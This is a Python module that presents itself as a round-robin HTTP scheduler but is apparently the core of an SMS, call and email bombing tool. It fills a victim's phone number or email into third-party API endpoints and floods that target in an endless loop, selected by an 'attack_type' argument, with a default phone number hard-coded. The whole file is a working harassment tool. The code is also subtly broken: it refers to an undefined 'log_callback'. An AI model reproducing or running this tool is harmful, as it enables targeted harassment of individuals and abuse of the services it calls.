"""worker.py — Round-robin HTTP request scheduler.
Loads APIs from api_config.json, iterates through them one by one
with a configurable delay, and loops back to the start after exhausting all.
"""

import asyncio
import json
import logging
import time
from pathlib import Path
from typing import Callable, Optional

import aiohttp

logger = logging.getLogger(__name__)

CONFIG_PATH = Path(__file__).parent / "api_config.json"


def load_config() -> dict:
    """Load the API configuration from JSON file."""
    if not CONFIG_PATH.exists():
        raise FileNotFoundError(f"Config file not found: {CONFIG_PATH}")
    with open(CONFIG_PATH, "r") as f:
        return json.load(f)


def get_endpoints(config: dict, attack_type: str, target: str) -> list[dict]:
    """
    Extract and resolve endpoints for the given attack_type.
    Replaces {target} placeholders with the actual target value.
    """
    targets = config.get("targets", {})

    if attack_type == "sms":
        entries = targets.get("phone", {}).get("sms", [])
    elif attack_type == "call":
        entries = targets.get("phone", {}).get("call", [])
    elif attack_type == "email":
        entries = targets.get("email", {}).get("email", [])
    else:
        return []

    resolved = []
    for entry in entries:
        resolved_url = entry["url"].replace("{target}", target)
        resolved_headers = {}
        for k, v in entry.get("headers", {}).items():
            resolved_headers[k] = v.replace("{target}", target) if isinstance(v, str) else v

        resolved_body = None
        if "body_template" in entry and entry["body_template"]:
            resolved_body = {}
            for k, v in entry["body_template"].items():
                resolved_body[k] = v.replace("{target}", target) if isinstance(v, str) else v

        resolved.append({
            "name": entry.get("name", "unknown"),
            "method": entry.get("method", "POST"),
            "url": resolved_url,
            "headers": resolved_headers,
            "body": resolved_body,
        })

    return resolved


async def send_request(
    session: aiohttp.ClientSession,
    endpoint: dict,
) -> tuple[bool, int, str]:
    """
    Send a single HTTP request based on endpoint config.
    Returns (success, status_code, message).
    """
    method = endpoint["method"].upper()
    url = endpoint["url"]
    headers = endpoint.get("headers", {})
    body = endpoint.get("body")

    try:
        start = time.time()

        if method == "GET":
            async with session.get(url, headers=headers, timeout=15) as resp:
                status = resp.status
                await resp.read()  # consume response
        elif method == "POST":
            async with session.post(url, headers=headers, json=body, timeout=15) as resp:
                status = resp.status
                await resp.read()
        elif method == "PUT":
            async with session.put(url, headers=headers, json=body, timeout=15) as resp:
                status = resp.status
                await resp.read()
        elif method == "DELETE":
            async with session.delete(url, headers=headers, timeout=15) as resp:
                status = resp.status
                await resp.read()
        else:
            async with session.request(method, url, headers=headers, json=body, timeout=15) as resp:
                status = resp.status
                await resp.read()

        elapsed = time.time() - start
        success = 200 <= status < 300
        msg = f"{endpoint['name']} -> {status} ({elapsed:.2f}s)"

        if log_callback:
            log_callback(f"[{'✓' if success else '✗'}] {msg}")

        return success, status, msg

    except asyncio.TimeoutError:
        msg = f"{endpoint['name']} -> TIMEOUT"
        if log_callback:
            log_callback(f"[✗] {msg}")
        return False, 0, msg

    except aiohttp.ClientError as e:
        msg = f"{endpoint['name']} -> ERROR: {str(e)[:60]}"
        if log_callback:
            log_callback(f"[✗] {msg}")
        return False, 0, msg

    except Exception as e:
        msg = f"{endpoint['name']} -> EXCEPTION: {str(e)[:60]}"
        if log_callback:
            log_callback(f"[✗] {msg}")
        return False, 0, msg


async def scheduler_loop(
    attack_type: str,
    target: str,
    delay: float = 2.0,
    cancel_event: Optional[asyncio.Event] = None,
    pause_event: Optional[asyncio.Event] = None,
    status_callback: Optional[Callable] = None,
):
    """
    Main scheduler loop:
    - Loads config
    - Iterates through all endpoints for the given attack_type
    - Sends one request per endpoint
    - Waits `delay` seconds between requests
    - After last endpoint, loops back to the start
    - Continues until cancel_event is set
    """
    if cancel_event is None:
        cancel_event = asyncio.Event()
    if pause_event is None:
        pause_event = asyncio.Event()
        pause_event.set()  # not paused by default

    config = load_config()

    total_sent = 0
    total_failed = 0
    current_endpoint = ""

    connector = aiohttp.TCPConnector(limit=100)
    timeout = aiohttp.ClientTimeout(total=30)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while not cancel_event.is_set():
            # Wait if paused
            await pause_event.wait()

            endpoints = get_endpoints(config, attack_type, target)

            if not endpoints:
                logger.warning(f"No endpoints found for attack_type={attack_type}")
                if status_callback:
                    status_callback(f"[WARN] No endpoints for {attack_type}")
                await asyncio.sleep(5)
                continue

            logger.info(
                f"Starting round-robin cycle: {len(endpoints)} endpoints, "
                f"type={attack_type}, target={target}"
            )
            if status_callback:
                status_callback(
                    f"[↻] Starting round: {len(endpoints)} endpoints for {attack_type}"
                )

            for endpoint in endpoints:
                # Check stop signal before each request
                if cancel_event.is_set():
                    return

                # Wait if paused
                await pause_event.wait()

                current_endpoint = endpoint["name"]

                success, status_code, msg = await send_request(session, endpoint)

                if success:
                    total_sent += 1
                else:
                    total_failed += 1

                # Report status
                if status_callback:
                    status_callback({
                        "total_sent": total_sent,
                        "total_failed": total_failed,
                        "current_endpoint": current_endpoint,
                        "last_result": msg,
                        "last_success": success,
                    })

                # Wait between requests
                await asyncio.sleep(delay)

            # Cycle complete — log and restart
            cycle_msg = (
                f"[↻] Cycle complete: sent={total_sent}, failed={total_failed}, "
                f"restarting from top..."
            )
            logger.info(cycle_msg)
            if status_callback:
                status_callback(cycle_msg)

            # Brief pause before starting new cycle
            await asyncio.sleep(0.5)


# ── For standalone testing ──
if __name__ == "__main__":
    import sys

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    target = sys.argv[1] if len(sys.argv) > 1 else "+911234567890"
    attack_type = sys.argv[2] if len(sys.argv) > 2 else "sms"
    delay = float(sys.argv[3]) if len(sys.argv) > 3 else 2.0

    print(f"Starting scheduler: type={attack_type}, target={target}, delay={delay}s")
    print("Press Ctrl+C to stop...\n")

    async def run():
        cancel = asyncio.Event()

        def status_handler(msg):
            if isinstance(msg, dict):
                print(f"  [{msg['total_sent']} sent | {msg['total_failed']} failed] "
                      f"Current: {msg['current_endpoint']} -> {msg['last_result']}")
            else:
                print(f"  {msg}")

        try:
            await scheduler_loop(
                attack_type=attack_type,
                target=target,
                delay=delay,
                cancel_event=cancel,
                status_callback=status_handler,
            )
        except asyncio.CancelledError:
            pass

    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print("\nStopped by user.")